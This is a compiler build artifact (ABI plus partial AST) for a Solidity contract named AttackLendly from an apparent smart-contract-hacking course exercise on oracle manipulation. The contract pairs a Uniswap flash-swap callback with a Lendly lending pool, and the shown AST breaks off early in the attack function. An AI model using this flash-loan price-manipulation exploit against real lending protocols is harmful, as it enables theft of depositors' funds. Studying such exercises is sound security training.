{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_pair",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_lendly",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount0",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "amount1",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "data",
          "type": "bytes"
        }
      ],
      "name": "uniswapV2Call",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "allSourcePaths": {
    "0": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/access/Ownable.sol",
    "1": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/IERC20.sol",
    "2": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/utils/Context.sol",
    "3": "contracts/oracle-manipulation-2/AttackLendly.sol",
    "4": "interfaces/IUniswapV2.sol"
  },
  "ast": {
    "absolutePath": "contracts/oracle-manipulation-2/AttackLendly.sol",
    "exportedSymbols": {
      "AttackLendly": [
        373
      ],
      "Context": [
        1280
      ],
      "IERC20": [
        564
      ],
      "ILendly": [
        21
      ],
      "IUniswapV2Pair": [
        867
      ],
      "Ownable": [
        486
      ]
    },
    "id": 374,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "0.8",
          ".13"
        ],
        "nodeType": "PragmaDirective",
        "src": "116:23:3"
      },
      {
        "absolutePath": "interfaces/IUniswapV2.sol",
        "file": "../../interfaces/IUniswapV2.sol",
        "id": 3,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 374,
        "sourceUnit": 1259,
        "src": "141:63:3",
        "symbolAliases": [
          {
            "foreign": {
              "id": 2,
              "name": "IUniswapV2Pair",
              "nodeType": "Identifier",
              "overloadedDeclarations": [],
              "referencedDeclaration": 867,
              "src": "149:14:3",
              "typeDescriptions": {}
            },
            "nameLocation": "-1:-1:-1"
          }
        ],
        "unitAlias": ""
      },
      {
        "absolutePath": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/token/ERC20/IERC20.sol",
        "file": "@openzeppelin/contracts/token/ERC20/IERC20.sol",
        "id": 5,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 374,
        "sourceUnit": 565,
        "src": "205:70:3",
        "symbolAliases": [
          {
            "foreign": {
              "id": 4,
              "name": "IERC20",
              "nodeType": "Identifier",
              "overloadedDeclarations": [],
              "referencedDeclaration": 564,
              "src": "213:6:3",
              "typeDescriptions": {}
            },
            "nameLocation": "-1:-1:-1"
          }
        ],
        "unitAlias": ""
      },
      {
        "absolutePath": "/Users/m4ud/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.8.0/contracts/access/Ownable.sol",
        "file": "@openzeppelin/contracts/access/Ownable.sol",
        "id": 6,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 374,
        "sourceUnit": 487,
        "src": "276:52:3",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "ILendly",
        "contractDependencies": [],
        "contractKind": "interface",
        "fullyImplemented": false,
        "id": 21,
        "linearizedBaseContracts": [
          21
        ],
        "name": "ILendly",
        "nameLocation": "340:7:3",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "functionSelector": "47e7ef24",
            "id": 13,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "deposit",
            "nameLocation": "363:7:3",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 11,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 8,
                  "mutability": "mutable",
                  "name": "_token",
                  "nameLocation": "379:6:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 13,
                  "src": "371:14:3",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 7,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "371:7:3",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 10,
                  "mutability": "mutable",
                  "name": "_amount",
                  "nameLocation": "395:7:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 13,
                  "src": "387:15:3",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 9,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "387:7:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "370:33:3"
            },
            "returnParameters": {
              "id": 12,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "412:0:3"
            },
            "scope": 21,
            "src": "354:59:3",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "functionSelector": "4b8a3529",
            "id": 20,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "borrow",
            "nameLocation": "427:6:3",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 18,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 15,
                  "mutability": "mutable",
                  "name": "_token",
                  "nameLocation": "442:6:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 20,
                  "src": "434:14:3",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 14,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "434:7:3",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 17,
                  "mutability": "mutable",
                  "name": "_amount",
                  "nameLocation": "458:7:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 20,
                  "src": "450:15:3",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 16,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "450:7:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "433:33:3"
            },
            "returnParameters": {
              "id": 19,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "475:0:3"
            },
            "scope": 21,
            "src": "418:58:3",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 374,
        "src": "330:148:3",
        "usedErrors": []
      },
      {
        "abstract": false,
        "baseContracts": [
          {
            "baseName": {
              "id": 23,
              "name": "Ownable",
              "nodeType": "IdentifierPath",
              "referencedDeclaration": 486,
              "src": "594:7:3"
            },
            "id": 24,
            "nodeType": "InheritanceSpecifier",
            "src": "594:7:3"
          }
        ],
        "canonicalName": "AttackLendly",
        "contractDependencies": [],
        "contractKind": "contract",
        "documentation": {
          "id": 22,
          "nodeType": "StructuredDocumentation",
          "src": "480:88:3",
          "text": " @title AttackLendly\n @author JohnnyTime (https://smartcontractshacking.com)"
        },
        "fullyImplemented": true,
        "id": 373,
        "linearizedBaseContracts": [
          373,
          486,
          1280
        ],
        "name": "AttackLendly",
        "nameLocation": "578:12:3",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "id": 27,
            "mutability": "immutable",
            "name": "lendly",
            "nameLocation": "635:6:3",
            "nodeType": "VariableDeclaration",
            "scope": 373,
            "src": "609:32:3",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_ILendly_$21",
              "typeString": "contract ILendly"
            },
            "typeName": {
              "id": 26,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 25,
                "name": "ILendly",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 21,
                "src": "609:7:3"
              },
              "referencedDeclaration": 21,
              "src": "609:7:3",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_ILendly_$21",
                "typeString": "contract ILendly"
              }
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 30,
            "mutability": "immutable",
            "name": "pair",
            "nameLocation": "680:4:3",
            "nodeType": "VariableDeclaration",
            "scope": 373,
            "src": "647:37:3",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
              "typeString": "contract IUniswapV2Pair"
            },
            "typeName": {
              "id": 29,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 28,
                "name": "IUniswapV2Pair",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 867,
                "src": "647:14:3"
              },
              "referencedDeclaration": 867,
              "src": "647:14:3",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                "typeString": "contract IUniswapV2Pair"
              }
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 33,
            "mutability": "immutable",
            "name": "token0",
            "nameLocation": "715:6:3",
            "nodeType": "VariableDeclaration",
            "scope": 373,
            "src": "690:31:3",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IERC20_$564",
              "typeString": "contract IERC20"
            },
            "typeName": {
              "id": 32,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 31,
                "name": "IERC20",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 564,
                "src": "690:6:3"
              },
              "referencedDeclaration": 564,
              "src": "690:6:3",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$564",
                "typeString": "contract IERC20"
              }
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 36,
            "mutability": "immutable",
            "name": "token1",
            "nameLocation": "752:6:3",
            "nodeType": "VariableDeclaration",
            "scope": 373,
            "src": "727:31:3",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_IERC20_$564",
              "typeString": "contract IERC20"
            },
            "typeName": {
              "id": 35,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 34,
                "name": "IERC20",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 564,
                "src": "727:6:3"
              },
              "referencedDeclaration": 564,
              "src": "727:6:3",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_IERC20_$564",
                "typeString": "contract IERC20"
              }
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 38,
            "mutability": "mutable",
            "name": "reserve0",
            "nameLocation": "780:8:3",
            "nodeType": "VariableDeclaration",
            "scope": 373,
            "src": "764:24:3",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 37,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "764:7:3",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "private"
          },
          {
            "constant": false,
            "id": 40,
            "mutability": "mutable",
            "name": "reserve1",
            "nameLocation": "810:8:3",
            "nodeType": "VariableDeclaration",
            "scope": 373,
            "src": "794:24:3",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 39,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "794:7:3",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "visibility": "private"
          },
          {
            "body": {
              "id": 79,
              "nodeType": "Block",
              "src": "869:192:3",
              "statements": [
                {
                  "expression": {
                    "id": 51,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 47,
                      "name": "pair",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 30,
                      "src": "879:4:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                        "typeString": "contract IUniswapV2Pair"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 49,
                          "name": "_pair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 42,
                          "src": "901:5:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 48,
                        "name": "IUniswapV2Pair",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 867,
                        "src": "886:14:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_IUniswapV2Pair_$867_$",
                          "typeString": "type(contract IUniswapV2Pair)"
                        }
                      },
                      "id": 50,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "886:21:3",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                        "typeString": "contract IUniswapV2Pair"
                      }
                    },
                    "src": "879:28:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                      "typeString": "contract IUniswapV2Pair"
                    }
                  },
                  "id": 52,
                  "nodeType": "ExpressionStatement",
                  "src": "879:28:3"
                },
                {
                  "expression": {
                    "id": 57,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 53,
                      "name": "lendly",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 27,
                      "src": "917:6:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_ILendly_$21",
                        "typeString": "contract ILendly"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 55,
                          "name": "_lendly",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 44,
                          "src": "934:7:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 54,
                        "name": "ILendly",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 21,
                        "src": "926:7:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_ILendly_$21_$",
                          "typeString": "type(contract ILendly)"
                        }
                      },
                      "id": 56,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "926:16:3",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_ILendly_$21",
                        "typeString": "contract ILendly"
                      }
                    },
                    "src": "917:25:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_ILendly_$21",
                      "typeString": "contract ILendly"
                    }
                  },
                  "id": 58,
                  "nodeType": "ExpressionStatement",
                  "src": "917:25:3"
                },
                {
                  "expression": {
                    "id": 67,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 59,
                      "name": "token0",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 33,
                      "src": "952:6:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$564",
                        "typeString": "contract IERC20"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "arguments": [],
                          "expression": {
                            "argumentTypes": [],
                            "expression": {
                              "arguments": [
                                {
                                  "id": 62,
                                  "name": "pair",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 30,
                                  "src": "983:4:3",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                                    "typeString": "contract IUniswapV2Pair"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                                    "typeString": "contract IUniswapV2Pair"
                                  }
                                ],
                                "id": 61,
                                "name": "IUniswapV2Pair",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 867,
                                "src": "968:14:3",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_contract$_IUniswapV2Pair_$867_$",
                                  "typeString": "type(contract IUniswapV2Pair)"
                                }
                              },
                              "id": 63,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "968:20:3",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                                "typeString": "contract IUniswapV2Pair"
                              }
                            },
                            "id": 64,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "token0",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 795,
                            "src": "968:27:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
                              "typeString": "function () view external returns (address)"
                            }
                          },
                          "id": 65,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "968:29:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 60,
                        "name": "IERC20",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 564,
                        "src": "961:6:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_IERC20_$564_$",
                          "typeString": "type(contract IERC20)"
                        }
                      },
                      "id": 66,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "961:37:3",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$564",
                        "typeString": "contract IERC20"
                      }
                    },
                    "src": "952:46:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_IERC20_$564",
                      "typeString": "contract IERC20"
                    }
                  },
                  "id": 68,
                  "nodeType": "ExpressionStatement",
                  "src": "952:46:3"
                },
                {
                  "expression": {
                    "id": 77,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 69,
                      "name": "token1",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 36,
                      "src": "1008:6:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$564",
                        "typeString": "contract IERC20"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "arguments": [],
                          "expression": {
                            "argumentTypes": [],
                            "expression": {
                              "arguments": [
                                {
                                  "id": 72,
                                  "name": "pair",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 30,
                                  "src": "1039:4:3",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                                    "typeString": "contract IUniswapV2Pair"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                                    "typeString": "contract IUniswapV2Pair"
                                  }
                                ],
                                "id": 71,
                                "name": "IUniswapV2Pair",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": 867,
                                "src": "1024:14:3",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_contract$_IUniswapV2Pair_$867_$",
                                  "typeString": "type(contract IUniswapV2Pair)"
                                }
                              },
                              "id": 73,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "1024:20:3",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                                "typeString": "contract IUniswapV2Pair"
                              }
                            },
                            "id": 74,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "token1",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 800,
                            "src": "1024:27:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
                              "typeString": "function () view external returns (address)"
                            }
                          },
                          "id": 75,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1024:29:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 70,
                        "name": "IERC20",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 564,
                        "src": "1017:6:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_IERC20_$564_$",
                          "typeString": "type(contract IERC20)"
                        }
                      },
                      "id": 76,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1017:37:3",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_IERC20_$564",
                        "typeString": "contract IERC20"
                      }
                    },
                    "src": "1008:46:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_IERC20_$564",
                      "typeString": "contract IERC20"
                    }
                  },
                  "id": 78,
                  "nodeType": "ExpressionStatement",
                  "src": "1008:46:3"
                }
              ]
            },
            "id": 80,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 45,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 42,
                  "mutability": "mutable",
                  "name": "_pair",
                  "nameLocation": "845:5:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 80,
                  "src": "837:13:3",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 41,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "837:7:3",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 44,
                  "mutability": "mutable",
                  "name": "_lendly",
                  "nameLocation": "860:7:3",
                  "nodeType": "VariableDeclaration",
                  "scope": 80,
                  "src": "852:15:3",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 43,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "852:7:3",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "836:32:3"
            },
            "returnParameters": {
              "id": 46,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "869:0:3"
            },
            "scope": 373,
            "src": "825:236:3",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 161,
              "nodeType": "Block",
              "src": "1104:670:3",
              "statements": [
                {
                  "assignments": [
                    86
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 86,
                      "mutability": "mutable",
                      "name": "wantedLoan",
                      "nameLocation": "1123:10:3",
                      "nodeType": "VariableDeclaration",
                      "scope": 161,
                      "src": "1115:18:3",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      },
                      "typeName": {
                        "id": 85,
                        "name": "uint256",
                        "nodeType": "ElementaryTypeName",
                        "src": "1115:7:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 87,
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1115:18:3"
                },
                {
                  "assignments": [
                    89
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 89,
                      "mutability": "mutable",
                      "name": "data",
                      "nameLocation": "1156:4:3",
                      "nodeType": "VariableDeclaration",
                      "scope": 161,
                      "src": "1143:17:3",
                      "stateVariable": false,
                      "storageLocation": "memory",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bytes_memory_ptr",
                        "typeString": "bytes"
                      },
                      "typeName": {
                        "id": 88,
                        "name": "bytes",
                        "nodeType": "ElementaryTypeName",
                        "src": "1143:5:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes_storage_ptr",
                          "typeString": "bytes"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 90,
                  "nodeType": "VariableDeclarationStatement",
                  "src": "1143:17:3"
                },
                {
                  "expression": {
                    "id": 97,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "components": [
                        {
                          "id": 91,
                          "name": "reserve0",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 38,
                          "src": "1227:8:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 92,
                          "name": "reserve1",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 40,
                          "src": "1237:8:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        null
                      ],
                      "id": 93,
                      "isConstant": false,
                      "isInlineArray": false,
                      "isLValue": true,
                      "isPure": false,
                      "lValueRequested": true,
                      "nodeType": "TupleExpression",
                      "src": "1226:21:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_tuple$_t_uint256_$_t_uint256_$__$",
                        "typeString": "tuple(uint256,uint256,)"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [],
                      "expression": {
                        "argumentTypes": [],
                        "expression": {
                          "id": 94,
                          "name": "pair",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 30,
                          "src": "1250:4:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IUniswapV2Pair_$867",
                            "typeString": "contract IUniswapV2Pair"
                          }
                        },
                        "id": 95,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getReserves",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 809,
                        "src": "1250:16:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
                          "typeString": "function () view external returns (uint112,uint112,uint32)"
                        }
                      },
